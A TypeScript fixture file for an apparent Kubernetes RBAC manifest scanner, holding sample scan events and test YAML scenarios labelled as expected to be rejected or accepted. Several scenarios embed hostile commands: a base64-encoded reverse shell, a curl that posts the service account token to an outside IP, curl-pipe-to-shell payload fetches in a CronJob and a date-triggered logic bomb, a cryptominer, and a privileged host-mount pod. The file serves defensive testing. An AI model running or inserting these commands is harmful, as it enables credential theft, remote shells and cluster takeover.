import { BenchmarkStats, SecurityBenchmarkEvent } from '../types/rbac';

export const INITIAL_BENCHMARK_STATS: BenchmarkStats = {
  filesScanned: 128,
  filesAccepted: 113,
  filesRejected: 15,
  threatsDetected: 3,
  warnings: 9,
};

export const INITIAL_BENCHMARK_EVENTS: SecurityBenchmarkEvent[] = [
  {
    id: 'SEC-1042',
    fileName: 'malicious.yaml',
    uploadedBy: 'Current User',
    date: '25 September 2026',
    time: '10:42 PM',
    timestamp: '2026-09-25T22:42:00Z',
    result: 'REJECTED',
    reason: 'Security threat scan failed. Interactive reverse shell signature detected.',
    score: 0,
    scanId: 'SCAN-8492',
    threatDetails: 'Interactive Bash TCP reverse shell (/dev/tcp/10.10.14.5/4444)',
  },
  {
    id: 'SEC-1041',
    fileName: 'roles.yaml',
    uploadedBy: 'jaya.vishnu',
    date: '25 September 2026',
    time: '10:37 PM',
    timestamp: '2026-09-25T22:37:00Z',
    result: 'ACCEPTED',
    reason: 'All multi-layer security and Kubernetes schema validation checks passed.',
    score: 98,
    scanId: 'SCAN-8491',
  },
  {
    id: 'SEC-1040',
    fileName: 'broken-role.yaml',
    uploadedBy: 'Current User',
    date: '25 September 2026',
    time: '10:31 PM',
    timestamp: '2026-09-25T22:31:00Z',
    result: 'REJECTED',
    reason: 'Invalid YAML syntax: Malformed indentation detected.',
    score: 25,
    scanId: 'SCAN-8490',
  },
  {
    id: 'SEC-1039',
    fileName: 'clusterroles.yaml',
    uploadedBy: 'jaya.vishnu',
    date: '25 September 2026',
    time: '10:24 PM',
    timestamp: '2026-09-25T22:24:00Z',
    result: 'ACCEPTED',
    reason: 'Verified Kubernetes ClusterRole manifest. Zero threats detected.',
    score: 96,
    scanId: 'SCAN-8489',
  },
  {
    id: 'SEC-1038',
    fileName: 'config-obfuscated.yaml',
    uploadedBy: 'sec-auditor',
    date: '25 September 2026',
    time: '09:55 PM',
    timestamp: '2026-09-25T21:55:00Z',
    result: 'REJECTED',
    reason: 'Abnormal content pattern detected. Suspicious base64 binary payload.',
    score: 18,
    scanId: 'SCAN-8488',
    threatDetails: 'Embedded binary executable header in annotation',
  },
  {
    id: 'SEC-1037',
    fileName: 'namespaces.yaml',
    uploadedBy: 'Current User',
    date: '25 September 2026',
    time: '09:12 PM',
    timestamp: '2026-09-25T21:12:00Z',
    result: 'ACCEPTED',
    reason: 'Passed all multi-layer security checks.',
    score: 100,
    scanId: 'SCAN-8487',
  },
  {
    id: 'SEC-1036',
    fileName: 'unsupported-blob.json',
    uploadedBy: 'dev-operator',
    date: '25 September 2026',
    time: '08:40 PM',
    timestamp: '2026-09-25T20:40:00Z',
    result: 'REJECTED',
    reason: 'Unsupported file type. Please upload YAML or YML files.',
    score: 10,
    scanId: 'SCAN-8486',
  },
];

// Test scenario manifests for quick evaluation covering all threat categories
export const TEST_VALIDATION_SCENARIOS = [
  {
    id: 'scenario-malicious-escalation',
    title: 'Malicious Escalation (Demo)',
    fileName: 'malicious-escalation.yaml',
    expectedScore: '0',
    expectedStatus: 'REJECTED',
    badge: 'CRITICAL THREAT',
    badgeColor: 'text-[#EF4444] bg-[#EF4444]/10 border-[#EF4444]/30',
    category: 'Privilege Escalation Chain',
    content: `apiVersion: v1
kind: ServiceAccount
metadata:
  name: cicd-runner
  namespace: staging
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: deployment-helper
  namespace: staging
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["create", "get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: cicd-deployment-binding
  namespace: staging
subjects:
  - kind: ServiceAccount
    name: cicd-runner
    namespace: staging
roleRef:
  kind: Role
  name: deployment-helper
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: v1
kind: Pod
metadata:
  name: staging-build-runner
  namespace: staging
spec:
  serviceAccountName: cicd-runner
  hostPID: true
  volumes:
    - name: host-mount
      hostPath:
        path: /
  containers:
    - name: runner-worker
      image: alpine:3.19
      securityContext:
        privileged: true
      volumeMounts:
        - name: host-mount
          mountPath: /host`,
  },
  {
    id: 'scenario-safe-app',
    title: 'Safe App Compliant (Demo)',
    fileName: 'safe-app.yaml',
    expectedScore: '100',
    expectedStatus: 'ACCEPTED',
    badge: 'SECURITY CLEARANCE',
    badgeColor: 'text-[#22C55E] bg-[#22C55E]/10 border-[#22C55E]/30',
    category: 'Clean Manifest',
    content: `apiVersion: v1
kind: ServiceAccount
metadata:
  name: web-frontend-sa
  namespace: production
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: web-frontend-role
  namespace: production
rules:
  - apiGroups: [""]
    resources: ["configmaps"]
    verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: web-frontend-binding
  namespace: production
subjects:
  - kind: ServiceAccount
    name: web-frontend-sa
    namespace: production
roleRef:
  kind: Role
  name: web-frontend-role
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web-frontend
  namespace: production
spec:
  replicas: 3
  selector:
    matchLabels:
      app: web-frontend
  template:
    metadata:
      labels:
        app: web-frontend
    spec:
      serviceAccountName: web-frontend-sa
      securityContext:
        runAsNonRoot: true
        runAsUser: 10001
      containers:
        - name: nginx
          image: nginx:1.25.4-alpine
          resources:
            limits:
              cpu: "500m"
              memory: "256Mi"
            requests:
              cpu: "100m"
              memory: "64Mi"
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop:
                - ALL
          ports:
            - containerPort: 8080`,
  },
  {
    id: 'scenario-privileged-deployer',
    title: 'Privileged Deployer Tool (Demo)',
    fileName: 'privileged-deployer.yaml',
    expectedScore: '0',
    expectedStatus: 'REJECTED',
    badge: 'CRITICAL THREAT',
    badgeColor: 'text-[#EF4444] bg-[#EF4444]/10 border-[#EF4444]/30',
    category: 'Privilege Escalation Chain',
    content: `apiVersion: v1
kind: Pod
metadata:
  name: deployer-tool-pod
  namespace: production
spec:
  hostPID: true
  volumes:
    - name: host-root
      hostPath:
        path: /
  containers:
    - name: tool
      image: alpine:3.19
      securityContext:
        privileged: true
      volumeMounts:
        - name: host-root
          mountPath: /host`,
  },
  {
    id: 'scenario-obfuscated-code',
    title: 'Obfuscated Base64 Payload',
    fileName: 'obfuscated-base64.yaml',
    expectedScore: '0',
    expectedStatus: 'REJECTED',
    badge: 'OBFUSCATED CODE',
    badgeColor: 'text-[#EF4444] bg-[#EF4444]/10 border-[#EF4444]/30',
    category: 'Logic Bomb / Obfuscated Code',
    content: `apiVersion: v1
kind: Pod
metadata:
  name: analytics-agent
  namespace: default
spec:
  containers:
    - name: runner
      image: alpine:3.19
      command: ["/bin/sh", "-c"]
      args:
        - "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDAmMQ== | base64 -d | sh"`,
  },
  {
    id: 'scenario-data-exfiltration',
    title: 'Data Exfiltration Risk',
    fileName: 'secret-exfiltration.yaml',
    expectedScore: '0',
    expectedStatus: 'REJECTED',
    badge: 'EXFILTRATION RISK',
    badgeColor: 'text-[#EF4444] bg-[#EF4444]/10 border-[#EF4444]/30',
    category: 'Data Exfiltration Risk',
    content: `apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: secret-reader-role
  namespace: default
rules:
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get", "list"]
---
apiVersion: v1
kind: Pod
metadata:
  name: billing-exporter
  namespace: default
spec:
  containers:
    - name: exporter
      image: alpine:3.19
      command: ["/bin/sh", "-c", "curl -X POST -d @/var/run/secrets/kubernetes.io/serviceaccount/token http://198.51.100.99:8080/exfil"]`,
  },
  {
    id: 'scenario-persistence',
    title: 'Persistence Mechanism',
    fileName: 'stealth-cronjob-persistence.yaml',
    expectedScore: '0',
    expectedStatus: 'REJECTED',
    badge: 'PERSISTENCE',
    badgeColor: 'text-[#EF4444] bg-[#EF4444]/10 border-[#EF4444]/30',
    category: 'Persistence Mechanism',
    content: `apiVersion: batch/v1
kind: CronJob
metadata:
  name: cluster-health-checker
  namespace: kube-system
spec:
  schedule: "* * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          restartPolicy: OnFailure
          containers:
            - name: checker
              image: alpine:3.19
              command: ["/bin/sh", "-c", "curl -s http://198.51.100.77/beacon.sh | sh"]`,
  },
  {
    id: 'scenario-resource-hijacking',
    title: 'Resource Hijacking (Mining)',
    fileName: 'cryptominer-unbounded.yaml',
    expectedScore: '0',
    expectedStatus: 'REJECTED',
    badge: 'RESOURCE HIJACK',
    badgeColor: 'text-[#EF4444] bg-[#EF4444]/10 border-[#EF4444]/30',
    category: 'Resource Hijacking',
    content: `apiVersion: v1
kind: Pod
metadata:
  name: compute-worker
  namespace: default
spec:
  containers:
    - name: miner
      image: xmrig/xmrig:latest
      command: ["xmrig", "--url=stratum+tcp://xmr-pool.org:3333"]`,
  },
  {
    id: 'scenario-supply-chain',
    title: 'Supply Chain Attack',
    fileName: 'untrusted-raw-ip-image.yaml',
    expectedScore: '0',
    expectedStatus: 'REJECTED',
    badge: 'SUPPLY CHAIN',
    badgeColor: 'text-[#EF4444] bg-[#EF4444]/10 border-[#EF4444]/30',
    category: 'Supply Chain Attack',
    content: `apiVersion: v1
kind: Pod
metadata:
  name: ingress-proxy
  namespace: default
spec:
  containers:
    - name: proxy
      image: 198.51.100.44:5000/custom-nginx:latest
      ports:
        - containerPort: 80`,
  },
  {
    id: 'scenario-logic-bomb',
    title: 'Logic Bomb (Delayed Trigger)',
    fileName: 'logic-bomb-delayed.yaml',
    expectedScore: '0',
    expectedStatus: 'REJECTED',
    badge: 'LOGIC BOMB',
    badgeColor: 'text-[#EF4444] bg-[#EF4444]/10 border-[#EF4444]/30',
    category: 'Logic Bomb / Obfuscated Code',
    content: `apiVersion: v1
kind: Pod
metadata:
  name: maintenance-routine
  namespace: default
spec:
  containers:
    - name: task
      image: alpine:3.19
      command: ["/bin/sh", "-c", "if [ $(date +%Y) -ge 2026 ]; then sleep 86400 && curl http://198.51.100.5/payload | sh; fi"]`,
  },
  {
    id: 'scenario-clean',
    title: 'Valid Clean File',
    fileName: 'safe-role.yaml',
    expectedScore: '98-100',
    expectedStatus: 'ACCEPTED',
    badge: 'SAFE',
    badgeColor: 'text-[#22C55E] bg-[#22C55E]/10 border-[#22C55E]/30',
    category: 'Clean Manifest',
    content: `apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: pod-reader
  namespace: default
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list", "watch"]`,
  },
  {
    id: 'scenario-invalid-yaml',
    title: 'Invalid YAML Syntax',
    fileName: 'broken-indentation.yaml',
    expectedScore: '25',
    expectedStatus: 'REJECTED',
    badge: 'MALFORMED',
    badgeColor: 'text-[#F59E0B] bg-[#F59E0B]/10 border-[#F59E0B]/30',
    category: 'Syntax Error',
    content: `apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: broken-role
rules:
  - apiGroups:
      - ""
    resources:
      - pods
    verbs:
      - get
      - list
     invalid indentation`,
  },
];
